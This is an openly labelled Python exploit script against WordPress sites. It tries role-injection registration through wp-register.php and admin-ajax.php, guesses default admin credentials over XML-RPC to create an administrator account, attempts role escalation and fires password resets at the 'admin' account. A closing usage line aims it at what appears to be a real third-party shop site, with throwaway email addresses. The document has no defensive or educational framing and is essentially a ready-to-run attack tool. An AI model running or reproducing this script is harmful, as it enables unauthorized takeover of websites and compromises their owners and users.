#!/usr/bin/env python3

import argparse
import requests
import re
import time
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import warnings

# Suppress SSL warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

class WordPressRegistrationExploit:
    def __init__(self, base_url, verify_ssl=False):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.verify_ssl = verify_ssl
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        }
    
    def extract_csrf_token(self, html):
        """Extract CSRF/nonce token from HTML"""
        patterns = [
            r'name="csrf"\s+value="([^"]+)"',
            r'name="_wpnonce"\s+value="([^"]+)"',
            r'name="registration_nonce"\s+value="([^"]+)"',
            r'id="csrf"\s+value="([^"]+)"',
            r'_wpnonce["\s:]+([a-f0-9]+)',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html)
            if match:
                return match.group(1)
        
        # Try BeautifulSoup
        soup = BeautifulSoup(html, 'html.parser')
        for name in ['csrf', '_wpnonce', 'registration_nonce', '_wp_http_referer']:
            token = soup.find('input', {'name': name})
            if token and token.get('value'):
                return token['value']
        
        return None
    
    def check_user_role(self, username, password):
        """Check if user is admin by trying to login"""
        login_url = f"{self.base_url}/wp-login.php"
        
        try:
            # Get login page
            resp = self.session.get(login_url, headers=self.headers, verify=self.verify_ssl)
            
            # Prepare login data
            data = {
                'log': username,
                'pwd': password,
                'wp-submit': 'Log In',
                'redirect_to': f"{self.base_url}/wp-admin/",
                'testcookie': '1'
            }
            
            # Try to login
            resp = self.session.post(login_url, data=data, headers=self.headers, 
                                    verify=self.verify_ssl, allow_redirects=True)
            
            # Check if redirected to admin panel
            if '/wp-admin/' in resp.url and resp.status_code == 200:
                # Try to access user page to check role
                user_url = f"{self.base_url}/wp-admin/user-edit.php?user_id=1"
                resp = self.session.get(user_url, headers=self.headers, verify=self.verify_ssl)
                
                if 'administrator' in resp.text.lower():
                    return 'administrator'
                elif 'editor' in resp.text.lower():
                    return 'editor'
                elif 'author' in resp.text.lower():
                    return 'author'
                else:
                    return 'subscriber'
            else:
                return 'Login failed'
                
        except Exception as e:
            return f'Error: {str(e)}'
    
    def escalate_privileges_xmlrpc(self, username, password):
        """Try to escalate privileges via XML-RPC"""
        xmlrpc_url = f"{self.base_url}/xmlrpc.php"
        
        # Try to edit user profile and set role to administrator
        xml_payload = f'''<?xml version="1.0"?>
        <methodCall>
            <methodName>wp.editProfile</methodName>
            <params>
                <param><value><string>{username}</string></value></param>
                <param><value><string>{password}</string></value></param>
                <param>
                    <value>
                        <struct>
                            <member>
                                <name>role</name>
                                <value><string>administrator</string></value>
                            </member>
                        </struct>
                    </value>
                </param>
            </params>
        </methodCall>'''
        
        try:
            headers = self.headers.copy()
            headers['Content-Type'] = 'text/xml'
            
            resp = self.session.post(xmlrpc_url, data=xml_payload, headers=headers, 
                                    verify=self.verify_ssl)
            
            if resp.status_code == 200 and 'faultCode' not in resp.text:
                return True, "Privileges escalated via XML-RPC"
            
            return False, "XML-RPC escalation failed"
            
        except Exception as e:
            return False, str(e)
    
    def trigger_password_reset(self, username_or_email):
        """Trigger password reset link"""
        reset_url = f"{self.base_url}/wp-login.php?action=lostpassword"
        
        try:
            # Get reset page
            resp = self.session.get(reset_url, headers=self.headers, verify=self.verify_ssl)
            
            # Extract nonce
            csrf = self.extract_csrf_token(resp.text)
            
            # Prepare reset data
            data = {
                'user_login': username_or_email,
                'redirect_to': '',
                'wp-submit': 'Get New Password',
            }
            
            if csrf:
                data['_wpnonce'] = csrf
            
            # Submit reset request
            resp = self.session.post(reset_url, data=data, headers=self.headers, 
                                    verify=self.verify_ssl, allow_redirects=True)
            
            # Check response
            if 'check your email' in resp.text.lower() or 'password reset' in resp.text.lower():
                return True, "Password reset email sent"
            elif 'invalid username' in resp.text.lower():
                return False, "Invalid username or email"
            else:
                # Might still work
                return True, "Password reset requested (check email)"
                
        except Exception as e:
            return False, str(e)
    
    def method_wp_register_with_role(self, username, password, email, role='administrator'):
        """Register via /wp-register.php with role injection"""
        url = f"{self.base_url}/wp-register.php"
        
        try:
            # Get registration page
            resp = self.session.get(url, headers=self.headers, verify=self.verify_ssl)
            if resp.status_code != 200:
                return False, f"Registration page not accessible: {resp.status_code}"
            
            # Extract CSRF token
            csrf = self.extract_csrf_token(resp.text)
            
            # Prepare registration data with role injection attempts
            data = {
                'user_login': username,
                'user_email': email,
                'user_pass': password,
                'user_pass2': password,
                'role': role,  # Direct role parameter
                'wp_user_roles': role,  # Alternative role parameter
                'user_role': role,  # Another alternative
            }
            
            if csrf:
                data['csrf'] = csrf
                data['_wpnonce'] = csrf
            
            # Submit registration
            resp = self.session.post(url, data=data, headers=self.headers, 
                                    verify=self.verify_ssl, allow_redirects=True)
            
            # Check for success
            if resp.status_code == 200:
                if "success" in resp.text.lower() or "registered" in resp.text.lower():
                    return True, "Registration successful (role escalation attempted)"
                elif "error" in resp.text.lower():
                    error_match = re.search(r'<div[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)</div>', 
                                          resp.text, re.I | re.S)
                    if error_match:
                        return False, error_match.group(1).strip()
                
                return True, "Registration completed"
            
            return False, f"Unexpected status: {resp.status_code}"
            
        except Exception as e:
            return False, str(e)
    
    def method_xmlrpc_create_admin(self, username, password, email):
        """Create admin user via XML-RPC"""
        url = f"{self.base_url}/xmlrpc.php"
        
        # Try with default admin credentials first
        admin_users = ['admin', 'administrator', 'wpadmin']
        admin_passwords = ['admin', 'password', 'admin123', '123456']
        
        for admin_user in admin_users:
            for admin_pass in admin_passwords:
                xml_payload = f'''<?xml version="1.0"?>
                <methodCall>
                    <methodName>wp.newUser</methodName>
                    <params>
                        <param><value><string>{admin_user}</string></value></param>
                        <param><value><string>{admin_pass}</string></value></param>
                        <param>
                            <value>
                                <struct>
                                    <member>
                                        <name>username</name>
                                        <value><string>{username}</string></value>
                                    </member>
                                    <member>
                                        <name>password</name>
                                        <value><string>{password}</string></value>
                                    </member>
                                    <member>
                                        <name>email</name>
                                        <value><string>{email}</string></value>
                                    </member>
                                    <member>
                                        <name>role</name>
                                        <value><string>administrator</string></value>
                                    </member>
                                </struct>
                            </value>
                        </param>
                    </params>
                </methodCall>'''
                
                try:
                    headers = self.headers.copy()
                    headers['Content-Type'] = 'text/xml'
                    
                    resp = self.session.post(url, data=xml_payload, headers=headers, 
                                           verify=self.verify_ssl, timeout=10)
                    
                    if resp.status_code == 200 and "faultCode" not in resp.text:
                        return True, f"Admin created via XML-RPC (creds: {admin_user}:{admin_pass})"
                        
                except Exception:
                    continue
        
        return False, "XML-RPC admin creation failed"
    
    def method_ajax_register_with_role(self, username, password, email, role='administrator'):
        """Try registration via admin-ajax.php with role"""
        url = f"{self.base_url}/wp-admin/admin-ajax.php"
        
        payloads = [
            {
                'action': 'register_new_user',
                'user_login': username,
                'user_email': email,
                'user_pass': password,
                'role': role,
            },
            {
                'action': 'imic_agent_register',
                'username': username,
                'email': email,
                'pwd1': password,
                'pwd2': password,
                'role': role,
                'task': 'register',
            },
            {
                'action': 'custom_register_user',
                'username': username,
                'email': email,
                'password': password,
                'user_role': role,
            }
        ]
        
        for data in payloads:
            try:
                resp = self.session.post(url, data=data, headers=self.headers, 
                                        verify=self.verify_ssl)
                
                if resp.status_code == 200 and ('success' in resp.text.lower() or 
                                               'registered' in resp.text.lower()):
                    return True, f"Registered via AJAX: {data['action']}"
                    
            except Exception:
                continue
        
        return False, "AJAX registration failed"
    
    def exploit(self, username, password, email, role='administrator'):
        """Try all registration and escalation methods"""
        print(f"[*] Testing WordPress Registration Exploit")
        print(f"[*] Target: {self.base_url}")
        print(f"[*] Username: {username}")
        print(f"[*] Password: {password}")
        print(f"[*] Email: {email}")
        print(f"[*] Desired Role: {role}\n")
        
        methods = [
            ("wp-register.php (with role injection)", 
             lambda: self.method_wp_register_with_role(username, password, email, role)),
            ("XML-RPC admin creation", 
             lambda: self.method_xmlrpc_create_admin(username, password, email)),
            ("AJAX registration (with role)", 
             lambda: self.method_ajax_register_with_role(username, password, email, role)),
        ]
        
        registration_success = False
        
        for method_name, method_func in methods:
            print(f"[*] Trying: {method_name}")
            success, message = method_func()
            
            if success:
                print(f"[+] {message}")
                registration_success = True
                
                # Verify role
                print(f"[*] Verifying admin access...")
                time.sleep(2)
                user_role = self.check_user_role(username, password)
                print(f"[!] User created but role is: {user_role}")
                
                if user_role == 'administrator':
                    print(f"\n{'='*60}")
                    print(f"[+] FULL ADMIN ACCESS ACHIEVED!")
                    print(f"    Username: {username}")
                    print(f"    Password: {password}")
                    print(f"    Email: {email}")
                    print(f"    Role: administrator")
                    print(f"\n[+] Login at: {self.base_url}/wp-login.php")
                    print(f"{'='*60}\n")
                    return True
                else:
                    # Try privilege escalation
                    print(f"[!] Attempting privilege escalation...")
                    esc_success, esc_msg = self.escalate_privileges_xmlrpc(username, password)
                    
                    if esc_success:
                        print(f"[+] {esc_msg}")
                        print(f"[+] Try logging in again - you might have admin access now")
                    else:
                        print(f"[-] Escalation failed. Account created as: {user_role}")
                        print(f"[*] You can still try logging in and exploiting other vulnerabilities")
                
                # Trigger password reset
                print(f"\n[*] Triggering password reset email...")
                reset_success, reset_msg = self.trigger_password_reset(email)
                if reset_success:
                    print(f"[+] {reset_msg}")
                    print(f"[+] Check {email} for password reset link")
                else:
                    print(f"[-] {reset_msg}")
                
                break
            else:
                print(f"[-] {message}")
        
        if not registration_success:
            print("\n[-] All registration methods failed")
            
            # Try password reset for existing admin
            print(f"\n[*] Attempting password reset for 'admin' account...")
            reset_success, reset_msg = self.trigger_password_reset('admin')
            if reset_success:
                print(f"[+] {reset_msg}")
                print(f"[!] If admin email is compromised, you can reset their password")
        
        return registration_success

def main():
    parser = argparse.ArgumentParser(description="WordPress Registration & Privilege Escalation Exploit")
    parser.add_argument('-u', '--url', required=True, help='Target WordPress URL')
    parser.add_argument('--username', default='admin', help='Username to register')
    parser.add_argument('--password', default='MySecretPass123', help='Password')
    parser.add_argument('--email', default='0dmhj@2200freefonts.com', help='Email address')
    parser.add_argument('--role', default='administrator', help='Desired role (administrator, editor, author)')
    parser.add_argument('--verify-ssl', action='store_true', help='Verify SSL certificates')
    
    args = parser.parse_args()
    
    exploit = WordPressRegistrationExploit(args.url, args.verify_ssl)
    exploit.exploit(args.username, args.password, args.email, args.role)

if __name__ == "__main__":
    main()

## Usage python3 wordpress_passreset.py -u https://dlabshop.in/ --username Admin --password MySecretPass123 --email azgvind@hook2ad.com --role administrator
